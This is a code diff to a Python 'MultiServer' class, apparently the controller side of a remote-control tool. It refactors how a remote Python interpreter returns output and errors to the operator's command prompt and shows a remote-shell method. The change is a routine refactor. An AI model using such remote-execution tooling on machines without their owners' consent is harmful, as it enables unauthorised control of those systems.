@@ -377,15 +377,12 @@ class MultiServer(object):
         self.receive_file(conn, data, save_as)
         return True, save_as
 
-    def client_exec(self, conn, command) -> str:
+    def client_exec(self, conn, command) -> (str, str):
         """ Remote Python Interpreter """
-        # returns command_output/None
+        # returns command_output, error/None
         self.send(conn, json_dumps(['EXEC', command]))
         data = json_loads(self.receive(conn, _print=False))
-        if data[1] != None:
-            return data[1]
-        if data[0] != '':
-            return data[0]
+        return data[0], data[1]
 
     def python_interpreter(self, conn) -> None:
         """ Remote Python Interpreter CLI"""
@@ -395,9 +392,11 @@ class MultiServer(object):
             command = input('>> ')
             if command == 'exit' or command == 'exit()':
                 break
-            result = self.client_exec(conn, command)
-            if not result == None:
-                print(result.rstrip("\n"))
+            output, error = self.client_exec(conn, command)
+            if error == None:
+                print(output.rstrip("\n"))
+            else:
+                print(error)
 
     def client_shell(self, conn, command, _print=True) -> (str, str):
         """ Remote Shell with Client """
